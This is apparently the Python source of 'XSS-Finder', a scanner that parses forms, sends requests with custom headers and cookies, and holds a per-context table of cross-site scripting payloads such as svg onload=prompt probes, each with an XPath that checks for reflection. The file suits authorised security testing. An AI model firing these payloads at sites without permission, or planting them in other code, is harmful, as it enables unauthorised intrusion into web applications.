from sklearn.feature_extraction.text import CountVectorizer
from sklearn.tree import DecisionTreeClassifier
from urllib.parse import urljoin, urlparse
from collections import Counter
from lxml import html as lxml_html
from bs4 import BeautifulSoup
import pandas as pd
import argparse
import sys
import os
import queue
import signal
import requests
import warnings
import shutil
import html

current_dir = os.path.dirname(__file__)
parent_dir = os.path.abspath(os.path.join(current_dir, os.pardir))
sys.path.append(parent_dir)


class Banner:
    @staticmethod
    def display() -> str:
        banner = """
        _____________________________
        < XSS-Finder by @OsmanTunahan >
        -----------------------------
                \\  ^__^
                 \\ (oo)\\_______
                   (__)\\       )\\/ 
                        ||----w |
                        ||     ||

        Author: OsmanTunahan
        Github: https://www.github.com/OsmanTunahan
        """
        print(banner)


class HttpRequest:
    def __init__(self, user_agent=None, custom_headers=None, custom_cookie=None):
        self.headers = {"User-Agent": user_agent} if user_agent else {}
        if custom_headers:
            self.headers.update(custom_headers)
        if custom_cookie:
            self.headers["Cookie"] = custom_cookie

    def send(self, target_url, request_data=None, form_data=None):
        try:
            if form_data is not None:
                response = requests.post(target_url, data=form_data, headers=self.headers)
            elif request_data is not None:
                response = requests.get(target_url, params=request_data, headers=self.headers)
            else:
                response = requests.get(target_url, headers=self.headers)
            return response.text
        except Exception as e:
            print(f"[!] Error occurred while sending request: {e}")
            return None


class HtmlParser:
    @staticmethod
    def parse_html(html_content):
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", category=UserWarning)
            return BeautifulSoup(html_content, 'html.parser')

    @staticmethod
    def parse_url(url):
        parsed_url = urlparse(url)
        return {
            "scheme": parsed_url.scheme,
            "domain": parsed_url.netloc,
            "path": parsed_url.path,
            "query": parsed_url.query,
            "params": parsed_url.params,
            "fragment": parsed_url.fragment
        }

    @staticmethod
    def parse_http_headers(http_headers):
        headers_dict = {}
        for header in http_headers.split('\n'):
            if ':' in header:
                key, value = header.split(':', 1)
                headers_dict[key.strip()] = value.strip()
        return headers_dict

    @staticmethod
    def parse_form(soup):
        form = soup.find("form")
        if not form:
            return None, None

        form_method = form.get("method").lower() if form.get("method") else "get"
        form_inputs = form.find_all("input")
        data = {input_field.get("name"): input_field.get("value", "jam") for input_field in form_inputs if input_field.get("name")}

        return form_method, data


class PayloadGenerator:
    def __init__(self):
        self.payloads = {
            'Attribute Name': [
                {"payload": "\"><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"},
                {"payload": " onload=prompt`964864` ", "find": "//*[@onload[contains(.,964864)]]"}
            ],
            'Attribute Value': [
                {"payload": "\"><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"},
                {"payload": "'\" onload=prompt`964864` ", "find": "//*[@onload[contains(.,964864)]]"}
            ],
            'HTML Tag': [
                {"payload": "<svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"}
            ],
            'Comment': [
                {"payload": "--><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"}
            ],
            'Js Single Quote': [
                {"payload": "</script><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"},
                {"payload": "'); prompt`964864`;//", "find": '//script[contains(text(), "prompt`964864`")]'}
            ],
            'Js Double Quote': [
                {"payload": "</script><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"},
                {"payload": "\")-prompt`964864`-//", "find": '//script[contains(text(), "prompt`964864`")]'}
            ]
        }

    def generate(self, context):
        return self.payloads.get(context, [])